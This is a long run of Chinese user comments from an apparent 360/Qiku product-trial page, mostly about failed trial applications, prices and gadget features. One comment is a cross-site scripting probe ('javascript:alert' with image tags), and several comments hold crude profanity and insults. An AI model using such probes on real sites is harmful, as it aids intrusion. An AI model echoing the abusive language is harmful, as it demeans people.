连续两次申请都不通过，而且连个理由都不给一个，感觉是忽悠人的，以后都不会参加了。
伤感加遗憾！
感觉这款机器构建面积小【43mmx27mmx180mm(毫米)】，精度低，速度慢【垂直建造速度为14毫米/小时】，还真看不出有什么实际应用价值。。。。远不如UCMake 树脂机（起版机/快速成型机）便宜和实用：高速、高精、低成本，树脂模，可以直接用于失蜡铸造、AB硅胶模合金铸造...（更多图片见QQ173823121空间）
中间的好多都没孩子，唉，黑呀
两辆电瓶车那不是四五千？那可比开银行好多了
好东西 到时候一定支持
哎，又没中，郁闷
样子能再酷点就更好了
感觉不错！
被忽悠了，以后不看这种广告
连续两次申请都不通过，而且连个理由都不给一个，
我不高兴了，没被选上，后果很严重，问一句，什么时候开卖，我已经答应给baby买了
连续两次申请都不通过，而且连个理由都不给一个。中间的好多都没孩子，唉，黑呀 
www.iphone58.cn  真正的苹果智能家居来了~
老弯腰，很需要 
结果在那里呀，怎么没有看到呀，抽到我没有呀 
真的太需要了  
玩枪战最棒了 
现在最关注的是什么时候开卖呀 
好漂亮的穿戴设备  
什么时候开卖啊，答应了给娃儿的。。
身为柯南迷【有一点】的我真的是好喜欢呢，↖(^ω^)↗加油！
(*^__^*) 控制总总不如自然，而且【有网友质疑红灯设计是否会给眼睛造成伤害这种事情就不得而知了。】不得而知....呵呵
产品性能怀疑中
咋卖的 ????????????????????????????
从来没中过，唉
支持360，越办越好！
不要买，坑爹的很，要收费的。你可以选择那些无需root就可以安装其他应用的盒子。
哪里有卖的啊，需要啊 ，抽来抽取 都是内定吗？
想要，不过太沉了点
哪里有卖啊，我要两个。
哎，没选中，什么时候上啊，孩子着急要买。
中签了，嘿嘿，谢谢360，一定认真使用和反馈使用报告
心中的梦想！
都是骗人的 就是搞宣传
有点假哦骗人的，等到你的试用品，娃儿都老了
这些广告都没搞头，这个东西出不出批量还是未知数。
以后再也不会来你这个网了
现在又不能买吗？
喜欢~~~！！！
看看再说！
太贵了，要是让我试用就好了
多少钱转让？
我一直在找这种眼镜 我期待着
我喜欢 我顶
我喜欢 我顶 
去你麻痹的  你们这些酸葡萄，这tm的是移动网卡了好吧！你去看看电信的试试？你妈逼的 能有这个快？能有这个便宜，你tmb能搞懂了再来bb？就算贵也是中国移动的上网资费贵!关这玩意儿啥事？
之前一直不知道微单是什么，，学习了，明白了，活到老学到老
感谢奇酷试用~~感谢360~~
准确说是自身产能不足，迫不得已还在装饥饿营销~
嗯   不错   支持360
价格应该不太贵吧~~~用360一直很放心~~估计在几块钱到二十几吧~~到时候多买他几个~~~要早点出来哦~~太有用了
什么时候出个脚踩的呢？
噢 ！！这就是是我想要的！
sb你觉得手洗累还是脚踩的累？洗衣机那力度能有多干净？还费电废水！这玩意环保又健身，这是神器啊 好吧！就差甩干功能了 烘干什么的这玩意上 不现实！
市场价能达到多少？
私人订制，模块化设计
牛逼，有钱人的玩具
“你没骗了我们”“你真是一个好人”“你真是一个活人”
“没骗了我们你真是一个好人你真是一个活人”
价格太贵，没优势、、
帮我留一块啊  
帮我留一块啊  
好失望啊！这么期待的产品竟然没中！
一直在期盼…中签…结果…失望…期盼…发行…
怎么只有149名中签了？还有一名是谁？是我吗？期盼！！
好恼火，等了那么久到现在都买不到，这不是饥饿营销 开始申请40万 现在连1半都到不了，估计卖的时候会更少。
为什么不定在明天发售！“六一”多好的日子，关爱儿童，还等什么！就定在明天！我第一个买售。一个关爱下一代人的老爷爷。
求试用~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
好想要啊·····╮(╯_╰)╭
大魅族， 就是好看
又是魅族君，哈哈
贵屎了啊。。。。
这个不错，挺喜欢的 
原生安卓，，，看腻了 
这是什么手机 ？？
肯定还在上学、 
我觉得好多都是内部人员，别只顾得宣传！
你们好厉害 - -都敢穿这个 
智键很方便，而且质量也很好 .
大爱啊，必须要买！！！！
就听说要出个这东东，看来是真的，要买！
喜欢是喜欢，估计电池又不行...
我日...这得多少银子啊
苹果这是屌炸天的节奏啊
近视的人带看得清么
这估计还没用两天了，就摔成碎片了
真的好贵啊.... 
点赞。。。
正好在装修房子
空气质量是人们一直在关心的问题，真心希望得到这么好的东西！
超赞   这可能会是一代新潮流啊  期待中···........
我天~~~~
...没我..
5W与5W-H有什么不同
傻吊，他说价格
空气质量是人们一直在关心的问题，真心希望得到这么好的东西！  空气质量是人们一直在关心的问题，真心希望得到这么好的东西！  空气质量是人们一直在关心的问题，真心希望得到这么好的东西！  空气质量是人们一直在关心的问题，真心希望得到这么好的东西！  空气质量是人们一直在关心的问题，真心希望得到这么好的东西！  
好想买一对
好贵啊！！！！！！
我晕 没有我
好失望啊！
不错嘛！！
我都等了好久
这个应该不符合实际
给孩子不错
性价比还可以
电动环保 装柯南
这是360唯一做的烂的东西
没抽中，，，啊             k《〈〈〈〈〈〈〈〈〈〈〈〈〈〈〈〈
什么时候上市，，， 
大家都给些评论O(∩_∩)O~
  不错  不错  不错
说拜了就是一个小巧的无限音箱罢了，而且还是想手表模样的。如果是我的话我宁愿带个手表，虽然新奇却不实用，而且那么小音量能有多大，这设计白痴。  毫无特点卖点
超想试用一下
很好～～～～～
谢谢  谢谢
谢谢 谢谢 
我的天啊怎么会没有我呀,太失万啦.
胶枪，又见胶枪，早就说胶枪是高科技吗
一直想要这么个东东，终于有人来关注研制他了，我挺 
作为 严重颈椎病的患者，这个东西 很需要
很想试用一下 
空气质量是人们一直在关心的问题，真心希望得到这么好的东西！
祝贺360又出新品 360又一次走出关键一步 ，支持360，正好在装修房子哦。希望得到!!
会不会掉下来？ 
不错比较漂亮
没搞错吧,这不是2啊!
这次没有你的份，下次吧。。很好的**。。。。
从来都没申请过别的东西，可360都申请两次了，怎么还是没中，太失望啦！直接打击我对申请的依赖度啊
这贵吗？你去看华为的500多。
3000美元啊！！！！！！！！！！！
希望能帮到每一个家庭，发现更多污染源，大家都来使用这种产品，创造美好健康生活。
感情的像问下，最后面那张图里面是不是三星？
怎么没有飞机拍的实时视频啊？
貌似这是一代的儿童卫士吧，不是2代的啊
我所在的城市，是西部污染最严重的城市，石河子。这里老人的比例又是全国最大的，所以这样的健康电子科技产品，居然在这个城市没有做到很好的宣传。我希望厂家能重视。
我从深圳到新疆，发现新疆污染程度很大，而且这里的人口老龄化非常严重。更重要的是，这里的人家庭里都基本有老年的健康保健产品，什么按摩仪器电子诊断血压或者什么治疗仪器的，我希望厂家能重视起来，我也希望厂家能将健康产品推广。北方的城市中很多都这样，做为空气净化，这个市场很大。还有孕妇，都希望有个新鲜的空气环境。
1k以内估计会买 这样的款式和索尼2带智能表有些相似
这不是索尼nex5c吗？我已经买了这个了
已经超越了使用价值了！
无语了，一个是网络硬盘，一个是物理存储盘，能比吗？
喜欢~~~~~~~~~
超酷~~喜欢
学习了，下次定注意哦。第一次写报告肯定漏洞百出，还望多提建议！
确实哦，智能硬件市场广阔，来到奇酷确实看到了很多惊喜之作。是否能试用上运气使然，但能如此近距离接触新奇酷，这个平台还不错！
不是都出来了吗， 怎么还在创意中啊，，，能不能更新一下啊
好奇，很好骑。健身馆买几个可以，一边健身一边洗衣服多有成就感啊 
功能果然强大，造型小巧。又能和健康挂靠，市场前景值得期待！
对于我这个马大虎是不错的选择哦。
这年代有黑的吗
怎么看这像是日本货 
赞！！！！！！！！
很帅气，不知道价格怎么样
超级无敌喜欢 很有感觉
 空气质量是人们一直在关心的问题，真心希望得到这么好的东西！孩子还小。希望能够给他们一个更好的生活环境。
tcl那个都没有申请到，希望这个可以
电池能用多久，有MH370续航时间长吗？
晕死，刚定了一款白色的，一开始不知道还有黑色的，不知道能不能换哦
看起来没看过我的评测。因为我电脑桌上已经有4屏了，电视柜上那台是留作纪念的绝版外星人3d显示器
坑啊 没有我
安全第一，期待中。
什么乱七八糟的东西呀。
这也算酷吗？
500以下会买，要是带投影可以看电影的话就好了，感觉只是可以打电话和录像用，要是用这么小的屏幕看电影肯定不行
喜欢滑板，但是是不是和平衡车一样了，支持了
好失望啊！
等待快递中...
等待快递中...
这个可以拿去吓人
普通人不需要这个、政府机关应该也不需要、大公司也不会需要套、因为怕泄密、、、只有两种人需要第一是富二代、、、第二是傻缺
没视频没真相
APP哪有我要下载
可以拿来军用、这个眼睛在我很小就想到了、到了现在才有外国人发明、中国人怎么不发明？
这要是戒指不见了，那还不疯了啊
出了绝对够买一个
果断卸载360所有产品，他妈的抽奖从来没抽中过，试用产品申请了N次，一次都没有选中过，去你妈逼的360
360  你妈的 果断卸载
唉，抢了白的，不想抢这个了，发热迅猛。。。
那个都没有申请到，希望这个可以。。
会不会被军方误认为UFO而击落？= =
试用不到,买不到.玩人啊...
试用不到,买不到.
    1000RMB
在此评论的都是申请失败的，我也是，只能等着买了，实在是太需要儿童卫士了！
邮寄给我把 
me too
绝对是顶级发烧友的选择。。
那你叫个屁 
我抢了一台闲置中......  
要不  就赶紧能让买到
100我要，
目前不能啊
那个儿童卫士都没有申请到，希望这个可以!
此款产品大大的满足了普通老百姓对儿童安全方面的市场，快点投入市场吧，超级期待中。我们怎么可以第一时间得知上市的相关消息？
挺不错的1
javascript:alert&lt;img&gt;[img]1[/img]
最后的大招亮了……给力啊.....
坐等购买开放！360啊，赶紧开启售卖吧！！！
我想知道这150个名额是怎么选的？以什么标准选的？还是随机选择的！
看了最后张图后才发现，原来T3这么大！我还以为会很小巧
价格是有点贵，但是能出10000买显卡的人，肯定不会在乎再多掏一点
款式不喜欢，不过3G挺吸引人的 
好东西啊！！！！
价格是有点贵
你从小就想到了，真是思想超前呀，可惜你也是笨蛋。
我的天啊，都卖翻了，，怎么还在创意啊，， 
很好，现在的空气污染太严重了
刚好像改善一下家里的环境
感觉好厉害的样子，就是没用过。现在的环境实在是太差了，是得好好治理一下了
手机上发展玩了，跑到手表上来发展，希望有让人惊喜的地方
最喜欢这种了~顶
大伙顶起来
好喜欢啊，真想弄一个玩一玩！！！！
谢谢  谢谢
赞！！楼主手好巧~~
骗人的东西永远不要信，都是在抄作
对啊，不是说只有iphone5么
那个都没有申请到，希望这个可以。
多少钱啊😱怎么没有，商品不标价整什么？ 
谁说的这些话？ 谁说吧苹果的手机、平板电脑给孩子就有伤害
看着还不错
这个实用性好呀！期待……
你要无线路由器可以天天带着走？
还是联通的网速好啊，电话信号就不说了，无线上网还是联通的速度和覆盖能力都比移动好，价格也便宜，你看新出的4G整合套餐就知道了，相对比移动便宜
希望可以吧 
都6月份了怎么还没有正式版的消息！
好像……和我几个同事买的各种其他品牌相比，还算价格适中啊
申请不到死不罢休
最爱黑色 等放假一定去体验店看看
除了实用的新功能以外 最喜欢的就是防尘防水了
你那么厉害  带个无线路由器出去逛街  旅游啊  
什么时候出啊！能不能出个支持联通的啊。。。还是感觉联通的网络能快点。。。。移动的网络真心不行啊。。。你出联通版我就买嘿嘿  
这不是路由器。。。这是便携试的网卡360的叫WIFI  其他牌子的叫MIFI 省去U盘试的卡托 把网卡插进去 直接变成WIFI 
烧了三炷香啦    希望能申请到
卖给我呀~~
别人早就出了可以自动通话儿童定位手表了，360现在才局限于定位，垃圾 
对OPPO的FIND7支持不好，其中单击抓拍不可用，双击调取相机失败，无法调用相机
希望可以吧啊
那天在广场看见上有人玩，似乎不错
以后的电子产品，手机的作用越来越变得智能化，可穿戴产品是一种趋势，折叠，生物电池，太阳能会是越来越普遍，新奇好玩，酷，会越来越收到关注，普通的产品会被淘汰。
觉得产品的实际与宣传的不是很相符，因为所有的都差不多
速度怎么样？电池还有智能系统估计是硬伤
第一次申请啊，会不会直接拿到手啊！！！
希望大家能多多支持   谢谢
这方面的东西 好几年前就有的，只是国内较少而已
我希望给我儿子买一个
假的，根本没有
哪里有卖?
居然没申请通过 ，从电脑到手机，再到平板电脑，安装后各类360软件，看来这个号是被拉黑了，有空把各类应用改换腾迅的软件
飞的矮肯定被击落，土豪们的玩具，我们玩不起
如果再加多一点文字说明就好了。。。有一些图片都不明觉厉。。总之，赞！
已经买了，使用真的很好。而且苹果用户可以随时携带插在耳机口！方便。
你家里真有钱 什么东西都是好的
体感车最近两年价格确实跌了很多，但是想做到全民最后两公里的代步工具，质量一定要保证，售后体系要完善，价格还能更亲民一些。
希望出联通和电信版本的，而且最好做成5000毫安以上，带移动电源功能。
干抢到了但是什么时候发货呢？？
我的儿子很想要，什么时候正式发售？
喜欢接受新鲜事物，尝试新奇产品，具有一定的专业知识，但愿能够参与测试，相信会有满意的测试报告。
尝试新奇产品，第一次申请啊，会不会直接拿到手啊！！！ 
神の手！赞！
偏振片的原理 自己也可以做  网上有相关视频
把臭脚丫子放上去，爆表。
放到室外会则样？
挺便宜的 都什么眼神啊 人家是累计销售11万多 最贵的4000块 好吗
很有创意 价格有点太高了
魔声的詹姆斯限量版2000+完秒兰博基尼
前几年就出来了啊
市面上已经有成型的了，可能没有这个效率高，没有连接手机的功能。
你接到发货的通知没有 如果发货了是不是在订单可以查看 我也是幸运中签了
大部分3D打印机的确可以堆金属，但这台就不要想了。。
骗子发的是第一代的，看图都看出来了。 辛亏没有被抽中，孩子不喜欢第一代的。
什么时候可以购买啊  
这款产品到底准不准啊？有人用了吗？和传统的相比有没有实用性？
赞！！！！！！！何时能出，希望尽快面市？
没抽中。。。哎，不给力啊。
外观很炫，但价格贵不适合于大部分学生。
你的360卫士1也是抽中的吗？
应该不错吧！
怎么购买啊
期待你的表现
山寨，高仿大疆啊！！！！！大疆快来看啊
好想要很漂亮 有些贵
这个好  我喜欢  
白天京东通知到手机，我没有抢到，晚上通知的时候抢到了，坐等明天收货，呵呵。
售价大概多少
我比较关心售价，电池能用多久，定位精度
没中，想买个，如果电池能力+定位精度可以的话
是不是6月3号发货呀
对呀 是抽中的
我是7连败后才中的
据我了解续航能力好像是48小时 定位精度比1代强多了
(⊙o⊙)…额...这个具体我也不清楚   我看百度百科上说1代是199吧...
不实用，会被pi的
太期待了，电池电量不小啦 
如果卖这高价,大家一定选radeon r9 295x2了 性能差不多,AMD稳定性也不错,没必要再多花一倍的钱买差不多的产品.
哇哦，这个显卡，嘻嘻，我喜欢，这个绝对玩 《看门狗》《侠盗5》无压力啊。我喜欢就是，价格太贵了。 怎么办呢？如果可以免试用的话，可不可以给我个机会。
这个是我在这里见到过最酷的了。期待。
信号强了,幅射是不是也大了呢?对人伤害大不.现在的人都注重身体了,没发现那些空气净化器现在是卖的最好的?
没得电池了怎么办,如果系统出错了怎么办.不科学啊.
在哪买啊.一切为了孩子.
第一次申请居然抽到了，虽然到现在还没收到，不过我还是相信360的，看到以前的那么多试用报告，我也会出一份用心的试用评测报告，大家多多参加活动，多申请一定会得到的
神器  神气啊。。。
不会吧，发几张照片就算试用报告?
又买不到…天天叫叫叫………
能同时读室内外进行对比吗
不要了,生不下来的蛋
想知道价格跟购买渠道
为什么我就没收到。。。
挺有意思的！
值得期待！
好，但不知道怎么使用！
很好很强大，有截屏啦
很期待，不知价格怎样？
不对啊，适用的图片和广告的图片不一样啊，表盘一个是圆的，一个长方的啊 没中无所谓，但是看到官网报价199，淘宝可售价蛮高的，期待和广告一样的那款，长方形的表盘太大了，不适合孩子。 
为环保加油
IPX7防水功能，电池续航时间7天，感觉还不错。
希望下次多多分享
好失望呀......
这是1的儿童卫士吧
感觉不错！不知道功能是否强大~但外观要是能更漂亮些就好了
很喜欢，本来想作为6.1儿童节礼物送给孩子，但是天公不作美，没抽中。期待尽快上市。
骗子 大骗子
有没有人真的认真看完这篇报告了?
我觉得智能化产品就是为我们的生活美好而努力的，支持你们！
为什么连试用的申请记录都没有了？
1中2也中？ 你运气真的好啊
有心人的巧手能创造奇迹！
有联通就好了...
说实话，我感觉像电熨斗，好吧..我是不是视力不好
期待中签朋友们的试用报告。
应该很费电的吧！！！
我怎么觉得你的图片和人家的宣传图片有不一样的地方？
估计没电了，还的扛着自行车！
用处不大！！！
感觉真不错，跟柯南的太阳能滑板相似哈！
上市后做周边不？那个电池万一不能用了怎么办？
很期待产品面世，值得使用
耐心一些联系TCL或者联系奇酷，肯定能帮你修好的。
这是在拿一代儿童卫士占楼啊。哈哈哈
片纸……片纸……片纸……片纸……片纸……
欢迎你来我们公司参观。
额！亲，那是我们的那时候的众筹总价！
很不错，孩子，久坐，久用电脑手机的人都可用
我也申请了，可惜没通过，伤心，难过……
我的也是这种毛病，但是为什么客服不管我呢？反应完问题就没人搭理我了
亲！我们的这个没有需要1W多。现在众筹价，最贵的配套也只是3999 
亿航团队感谢您的信任与支持！
个我们已经经过测试，我们的四轴飞行器可以抗风5级。
发热很严重啊
失望~~~~~~~~~~
估计现在的空气质量，不管你在市内还是室外都是中度污染以上啊
还敢叫啊，我9连败 
555555555555 
未通过，唉！
价格是有点贵 
注定失败~~~这货 没有特色
这个设计！！！我直接用手机多好~~还用这货~~~
这类东西 你知道哪最烦么！！是主毛刷的事后处理上！！什么毛呀 纤维呀 都粘一起！！很不舒服的~~
没有通过，什么时候能上市购买啊？
什么时候上市，期待中......
饥饿营销，有卖点，但是做的太过了，路由需求很大，但是等不起的我们，会选择其他能买的到的买，有钱不信买不得东西，.... 现在市场都这么搞，死不了，没得量也活不长
不就是用了 新无线协议嘛，忽悠不懂的人,,,, 看到都烦
我也想要个
失望，同事说肯定没戏，结果真的没戏，唉，被忽悠了。 
真坑爹， 朋友们千万别提有价值性的建议，提了未必会有回报给你！
空气质量不好，我也想要一台测试一下
555555555，自己去买
请问这个怎么使用啊？需要办理通话卡？或者是办理无线网卡一样的套餐？
虽然没有抽到，但是我真的想买。能不能告诉我什么时间可以买到？？？？、 
多少钱？？？ 
怎么销售的？什么价格
何时开卖？不知辐射如何？
 我想说现在的猫眼的缺点：现在的猫眼并不能看清楚楼道的人的面容，或者说不能看全部楼道有几个人，以及他们所处于的动作，如果智能猫眼能自动调节外部光线，让在房屋内部的人能够看清楚楼道的人的面部表情，以及他们的动作等，这才是最重要。 其次是云保存照片，远程操作等
什么时候能发货啊，等得好心焦哦
恭喜  恭喜
    如果眼睛疲劳了 还可以自动缓解眼部疲劳就好了  这是非常完美的一件事情啊
外观看起来有些死板呢。
这个确实很不错，
这个不错，如果到试用时能选中就好啦。
如果还有别的儿童定位产品，我不打算买这个！申请不到，也买不到！你TM装什么大尾巴狼！试用!!!试用你妹啊！
听他们忽悠吧，鬼才信。
内部分完。
可是在白天日晒的时候跑长途，该眼镜没有偏光镜片的功能，普通人还是会选择偏光镜。 但是如果该眼睛具备偏光镜功能，也许价钱又会往上再涨，相对来说性价比有待考证。
完全暗箱操作呀     用试用套取用户信息   一贯的手段   不愧来自自然黑呀！
人品还可以，怎么就没中呢，试用没抽中只能等待正式发售吧，
很想买一个，增加儿童的安全系数
什么时候可以购买呀   好像有一个
感觉干净又阳光，但是价格偏高。
假的，绝对中不到，奇迹不会发生在你的身上！哈哈，别相信哦
太贵了·啊···
手机和通讯盒的距离在10米内，可控制飞机飞行1000米，现在众筹价格分别是2299/2399/2499/2599/3999 。支持使用图传眼镜，可看到实时影像。我们使用的是1080P高清摄像头。
是该改善改善了，有得卖吗
现在众筹价格分别是2299/2399/2499/2599/3999
虚拟墙写成虚似墙，服了你们
手机精确位置操控，也可微控前后上下左右。手机与通讯盒的距离是在10米范围内，手机操控飞行器可飞行1000米。
这个总比彩票的几率要高多了，透明度也高
满嘴好话给这么低的分 什么人啊
通过的概率实在是太小了，哎！
fasdfasdf
中奖了，今天给的短信……
这个非常不错，价格还可以
不怎么样啊啊
竟然通过试用了，很不错的样子，好期待
哈哈，最近运气不错，中了啊
希望***的时候能抽到我！我好想要啊！我最喜欢这种了，支持LG！
17W人 居然中了 没中的不好灰心总有中的一天
期待发货》》》》
中奖了，呵呵，送给孩子的六一礼物！
今天收到短息说可以***，真的很高兴谢谢！奇酷
刚收到短信，竟然中了，请楼主放心，让我试用就绝不会浪费你们一个产品，浪费你们一个机会，我会很认真的试用，很客观的评价，好就是好，要宣传，不好就是不好，要让你们知道用户对哪些还不满意以便修改后给用户带来更完美的产品。
防水吗?要是防水就好了，好贵啊
终于可以给孩子一份安全了！谢谢奇酷
刚收到短信，6月7日陆续发货哦，期待中！作为一名普通网友能成功试用，感谢360！
你没看报告后面部分吗 TCL服务差
下午收到短信，提示获得了试用资格，马上按短信提示加入了使用群。感谢奇酷，一定会将最真实的试用报告呈现。坐等6月7日··
今天收到短信说获得奇酷儿童卫士2的免费试用，挺惊喜的，申请过多次免费试用，从没成功过，所以这第一次很是兴奋了一下。加了QQ群，上传了照片，等着收货然后试用然后写报告了。。。期待中。。。
如果是手机没电的情况下呢，钱包是不是还是会保持联系呢
一共申请过3轮试用，前2次都没选中，就在感觉不会再爱了的时候，360终于给短信了，哈！期待！我的单反stand by了，坐等收货写报告！
早都有了，哪个商城都有卖的。
呜呜呜，没选上还有机会吗？
那你给我吧 
为什么预约短信来自世纪佳缘，感觉不对劲
。。。。。。。。。。。。。。。 
从来没有中过奖，居然这次能有机会试用，感谢360给我带来的运气，我会一直支持360的
手机就可以当便携无线路由啊，就是流量太坑爹
试用未通过。期望二代定位精度有所提高，录音质量大幅提升，改进充电接触不良等小毛病，增加部分实用功能，但现在没机会体验了。伤心……
怎么监控瞌睡来临？眨眼频率？头部位置?网上有位置感应器，低头就报警，几元钱，不太准。期待！
这明明是360女性卫士啊。
这样就试用报告了，呵呵……
估计还没上市呢。很期待。
什么时候上市？
好开心，今天收到短信感觉那么神奇，谢谢奇酷，真的很神奇，相信这里会有奇迹发生奇迹就会发生，非常期待这款儿童安全手表，这是最开心的事儿了！
中签了，很幸运，我会认真写《试用报告》，不会辜负工作人员对我们的信任！六一儿童节的喜悦，感谢奇虎360，感谢奇酷网的工作人员，六一因为有你们变得更加安全！六一因为有你们变得更加安心！！六一因为有你们变得更加精彩！！！我们与你一路同行，加油！
第一次试用成功，好期待啊，希望功能很强大，到时认真写试用心得。
什么时候出来~~~~~~~~~~~~~~~
下午收到短信，挺激动的，第一次试用成功，很意外，以前完全没想到会中签哦。感谢奇酷给我这个机会，谢谢！希望宝贝快快到来。
希望大家多给建议 我会持续更新的
货到以后...
期待明天的免测！
期待！！赶快试用吧
净化空气有一手
什么时候才能上市呀都2代了怎么还没上市呀！焦急等待中。
不知道是真的还是假的！我申请了，什么也没有！
淘宝有卖了249元一个！试用就是噱头！
能快点上市吗，试用也不能中，儿子正是需要这个的年龄，哎，
赶快试用--老是买不到
能平民价点不~~
这个总比彩票的几率要高多了，透明度也高，求能中啊啊！
希望物美价廉
一直在参加，坚持努力
目测就买不起。
速度开始了， 前段时间买的被同事抢走了。。。。 
安全路由器有闲置转让言传一声，转让给我
你不用转让给我咋样
弄几张图片就是试用报告啦！
还不错，信号和速度还行，就是需要抢，这点就太说不过去了，现在什么都抢，一点意思都没，出钱买还得靠运气看时间
这不就是无线网卡路由器吗，一般100多块钱一个，还要配上网卡，哪都有卖的了！ 其实这个东西没啥用我两个安卓手机就正好是一个当路由，一个上网玩，设置里面都有滴！
多少钱？有安利的逸新空气净化器好吗？HEPA滤网是多少纳米的？安利可是0.009纳米！
期待下次的中奖，居然没有我。还想好好写份报告呢！看来只有下次中了。
我建议转发微信朋友圈，点赞50个就送 
中奖名单哪里看呢 
这个挺有趣，就是他圆圆的要怎么放？
这样的试用报告~~真是浪费试用名额！
这个去农场怎么办？
我感觉比走了更累，还不如自行车呢
这是真正的皇帝的新装！
希望能变成大力神
没有容量有毛用！
要是有无线电力传导就好了，想挂在哪就挂在哪！
很不错，就是有点贵了！
好开心，今天收到短信感觉那么神奇，谢谢奇酷，真的很神奇，相信这里会有奇迹发生奇迹就会发生，非常期待这款儿童安全手表，这是最开心的事儿了！  
期待中。。。还有两个小时。。。。赶快试用吧
达文西的发明
搞个毛阿，这是1代手环，你就这么试用的阿，
太开心，感谢奇酷给了这个是用的机会，孩子正是需要这个的时候，非常期待！
这叫试用报告？？
我怎么就种不了呢 
什么啊？竟然有中1又中2的神人？我们这些不中1也不中2的人怎么活啊卧槽。。。。。
什么时候能够买到呀，很期待...... 另外辐射也是妈妈们考虑的问题，能否明确辐射的安全性？
花点时间对比一下功能吧，充数的文字没啥意思。。。
即将发送的“即将”是指多久，等了2个月了
项链的模样也该伪装一下
这个主意很不错啊。
一直在参加，坚持努力 
公开公平，产品也棒，价格也合适！永远支持，加油！
一直在参加，坚持努力 
Ghost是使用数字通讯系统飞行的，手机和通讯盒的范围在10内。智能手机操控优势：精确定位，安全起飞及降落，简单易操作，在悬停后可“微控”；实时语音及显示出我们的卫星数，飞行器电池电量，飞行距离，飞行高度，飞行速度，飞行时间。另外我们还为专业的玩家提供有传统遥控器接口，也能在室内（外）飞行。飞行距离可达1000米。
一直在参加，坚持努力 
一直在参加，坚持努力 
Ghost是使用数字通讯系统飞行的，手机和通讯盒的范围在10内。智能手机操控优势：精确定位，安全起飞及降落，简单易操作，在悬停后可“微控”；实时语音及显示出我们的卫星数，飞行器电池电量，飞行距离，飞行高度，飞行速度，飞行时间。另外我们还为专业的玩家提供有传统遥控器接口，也能在室内（外）飞行。飞行距离可达1000米。
没有申请到适用，孩子还小买一个也不错！很好的产品，感谢奇酷用心做出来的产品！
太假了，都是内部人·······
这个太有创意了！对于我这个爱手拍的人来说，这是上天给我的最大的礼物！！
王锐斯，之前我不相信，现在开始有点信了，赞同！！
公平竞争,合理,我喜欢,支持奇酷
买不到，还在标可预约！骗…
1.免费随身WiFi+8G（实际7.44G）优盘 2.安卓设备和电脑好搭档，极大地拓展了这款产品的功能 3.信号稳定，网速速度也可以（这与电脑设置，网络有较大关系）4.U盘内置了一些软件什么的，对一部分用户还是有些作用的 5.质量总体还信得过 6.造型迷你简约典雅，也便于携带 7.价格整体上来讲也还行
希望能带给我们一个惊喜啊，，，
几点开始?等不急了。
开始喽。申请喽。
以后还会有这款笔的试用吗？没选上哩，怎办
打错字了，是手表哦，呵呵
10期不中是什么
欧耶欧耶欧耶欧耶
这个绝对靠谱。价格也公道。
说的不错！！
继续支持奇酷！
支持奇酷，加油！
用过确实很好。急等。
两辆电瓶车的价格似乎有点小贵，重量能否再轻便一点，想象能放车车后备箱内，找好位置停好车，踩着板逛街去
打小的拼一起 就是个大的了。操作者的能力和创造力决定这个机器的伟大
360随身wifi 用过真心不错 现在急等这款
我也想要，会有机会吗？
1.免费随身WiFi+8G（实际7.44G）优盘 2.安卓设备和电脑好搭档，极大地拓展了这款产品的功能 3.信号稳定，网速速度也可以（这与电脑设置，网络有较大关系）4.U盘内置了一些软件什么的，对一部分用户还是有些作用的 5.质量总体还信得过 6.造型迷你简约典雅，也便于携带 7.价格整体上来讲也还行 不错，靠谱，用过360WIFI2，很好，这回这个更好了
没有申请到试用，希望可以买一个。。。什么时候可以上市呀
WOW ，方便手机一族啊，可以分享WIFI，可以遥控电脑关机，妈妈再也不用担心我睡觉忘记关电脑了；对于电脑小白来说也是不错的哦，360急救盘，救急时所需；10T云盘是上班一族必备啊，不用整天想着资料被放进哪里了，找不到了，真是太好了！！！
我要试用啊
这也是试用报告啊，一直都在关注这个东西，虽然市场上这种带gps的手环多了去了，但是还是相信360的品质与低廉的价格啊，但是可惜的是，居然没得卖！！！实在太让人恼火了
一直关注它很久了，期待试用！
给个机会吧，周哥！
给个机会吧，周哥！
我就已经购买许多360产品了，现在又出了360wifiU盘版试用机会。不过360wifi2代信号强度并不像路由器那样强，360wifiU盘版是否能再加强呐？如果U盘版可以插入电脑不是单纯的关机，而是关机开机都可以那就更强大了，如果U盘版可以充电当作手机充电宝，那就让科技e族更有科技范儿了，希望可以采纳，可以抽中我！
白色的好漂亮
***是想多了，3W的价格是不可能的，买泰坦Z完全靠信仰，信仰不满，是绝对不会购买的
这个怎么用没有看懂 不给创意不错 赞一下 
啊 又看了一遍看懂啦 360 为 安全 而生
感觉还不错
白色洁净！美观大方
是真的，以前我也用过呢。
目测买不起啊有木有
1.免费随身WiFi+8G（实际7.44G）优盘 2.安卓设备和电脑好搭档，极大地拓展了这款产品的功能 3.信号稳定，网速速度也可以（这与电脑设置，网络有较大关系）4.U盘内置了一些软件什么的，对一部分用户还是有些作用的 5.质量总体还信得过 6.造型迷你简约典雅，也便于携带 7.价格整体上来讲也还行
1.免费随身WiFi+8G（实际7.44G）优盘 2.安卓设备和电脑好搭档，极大地拓展了这款产品的功能 3.信号稳定，网速速度也可以（这与电脑设置，网络有较大关系）4.U盘内置了一些软件什么的，对一部分用户还是有些作用的 5.质量总体还信得过 6.造型迷你简约典雅，也便于携带 7.价格整体上来讲也还行
闲的蛋疼的人才会用这个。
1.免费随身WiFi+8G（实际7.44G）优盘 2.安卓设备和电脑好搭档，极大地拓展了这款产品的功能 3.信号稳定，网速速度也可以（这与电脑设置，网络有较大关系）4.U盘内置了一些软件什么的，对一部分用户还是有些作用的 5.质量总体还信得过 6.造型迷你简约典雅，也便于携带 7.价格整体上来讲也还行
很有创意就是价格有点太贵了，估计好多人会觉得还不如把剩饭倒了，去买花肥也花不了多少钱
为什么苹果系统没有客户端啊
早已不用。。。误触几率太大！
再不开放购买就买其它的了，等用U盘。
我已经购买过360随身WIFI2了``想了解其区别和优势!
好喜欢，有我份嘛╭(╯3╰)╮
好喜欢,希望可以得到。
假的很，试用报告写的很好的都没有，明显作假，对360彻底失望。
不错不错  晚上自拍神器啊
很好玩的宝贝吧
晚上自拍神器
期待！等用U盘和系统功能
太好了。真想来一个！
看着很不错，轮也该轮到我了吧
看着这多么好的一个东东啊 愿360赐予我  阿门。。
什么时候出的这好事
为了奇酷，我要得神秘大奖
都买了20几个360随身WiFi了，都是帮朋友买的，这东西真心想要一下，以后帮忙推广！
360随身WiFi U盘版太好了。WiFi+U盘+急救盘，这三者确实与我们的生活息息相关啊，既可以用手机看电影，又可以随时随地储存重要资料，还有关键时刻的救命盘，小小的一个东西，包含了这么多的东西，好像早点拿到手啊
